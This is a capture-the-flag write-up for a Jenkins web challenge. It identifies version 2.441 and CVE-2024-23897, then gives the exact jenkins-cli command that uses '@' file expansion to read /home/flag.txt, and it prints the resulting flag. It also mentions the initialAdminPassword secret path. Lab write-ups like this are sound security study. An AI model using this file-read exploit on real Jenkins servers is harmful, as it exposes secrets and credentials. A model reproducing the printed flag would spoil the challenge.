jankin-jenkins  
Category: Web  

Description: Welcome to jankin' jenkins, where everything that can go wrong with Jenkins... well, it will go wrong!

Link to the challenge: https://app.cyber-edu.co/challenges/9e864685-14ec-4adb-bc65-074f7b63c877?tenant=unbreakable

For this ctf, we have 3 questions, and the first 2 are very helpful for finding and exploiting the vulnerabilities that this site had.

First time entering the site, it shows us a login page. But that's irelevant.

<img width="1018" height="942" alt="image" src="https://github.com/user-attachments/assets/7a555597-4f54-403d-bf96-225fbcd8ed10" />


Q1:  What is the Jenkins version?
Flag format: x.xxx

I tried entering this path `/var/jenkins_home/secrets/initialAdminPassword` in the query (or every other path, that's irelevant too, I just needed to get to this page), I could see the version in the bottom-right corner

<img width="1919" height="998" alt="image" src="https://github.com/user-attachments/assets/48f142ea-2dac-4e96-bef3-e90683e9b98a" />

Answer: `2.441`

Q2: What CVE can be used to exploit Jenkins?
Flag format: CVE-xxxx-xxxxx

Here I can just simply search the web `jenkins 2.441 cve` and I can find the CVE easly.

Answer: `CVE-2024-23897`

Q3: What is the flag?
Flag format: ctf{sha256} located in /home/flag.txt

With the CVE known and doing more research, I found that I can do path traversal by using `@`, but not in the query, but by downloading a .jar file corresponding to the site version, and I downloaded it using curl:  
`curl -L -O http://34.40.82.22:30939/jnlpJars/jenkins-cli.jar`  

Checking the file:  
`└─$ file jenkins-cli.jar`  
`jenkins-cli.jar: Java archive data (JAR)`  

And then I used this command to exploit the vulnerability by using the `@` for path traversal, and getting the flag

`java -jar jenkins-cli.jar -s http://34.40.82.22:30939 help "@/home/flag.txt"`  

The last line of the output is the one were I could see the flag:

`ERROR: No such command CTF{a36f507ff69287bf3f49261f065167bb077d061b3d0d0d11d70b53b3ed3537d1}. Available commands are above.`

Flag: `CTF{a36f507ff69287bf3f49261f065167bb077d061b3d0d0d11d70b53b3ed3537d1}`
